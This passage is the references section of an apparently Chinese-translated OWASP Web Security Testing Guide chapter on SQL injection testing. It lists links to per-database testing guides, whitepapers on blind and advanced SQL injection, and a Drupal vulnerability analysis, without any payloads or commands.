- [WSTG-INPV-05](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#hex-encoding)
- [Top 10 2017-A1-注入攻击](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
- [SQL注入](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL注入](https://www.w3schools.com/sql/sql_injection.asp)

已为以下数据库管理系统创建了特定技术测试指南：

- [Oracle/WSTG](05.1-Testing_for_Oracle.md)
- [MySQL/WSTG](05.2-Testing_for_MySQL.md)
- [SQL Server/WSTG](05.3-Testing_for_SQL_Server.md)
- [PostgreSQL/WSTG](05.4-Testing_PostgreSQL.md)
- [MS Access/WSTG](05.5-Testing_for_MS_Access.md)
- [NoSQL/WSTG](05.6-Testing_for_NoSQL_Injection.md)
- [ORM/WSTG](05.7-Testing_for_ORM_Injection.md)
- [客户端/WSTG](05.8-Testing_for_Client-side.md)

### 白皮书

- [Victor Chapela: "高级SQL注入技术"](https://www.cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
- [Chris Anley: "更高级的SQL注入技术"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [David Litchfield: "基于SQL注入与推理的数据挖掘"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Imperva: "盲注SQL注入"](https://www.imperva.com/lg/lgw.asp?pid=369)
- [PortSwigger: "SQL注入速查表"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SPI Dynamics的Kevin Spett: "盲注SQL注入"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
- ["ZeQ3uL" (Prathan Phongthiproek) 和 "Suphot Boonchamnan": "超越SQLi：混淆与绕过技术"](https://www.exploit-db.com/papers/17934/)
- [Check Point威胁情报与研究团队的Adi Kaploun和Eliran Goshen: "最新SQL注入趋势分析"](https://blog.checkpoint.com/latest-sql-injection-trends/)

### 产品SQL注入漏洞文档

- [Drupal数据库注释过滤系统中SQL注入漏洞剖析 SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)
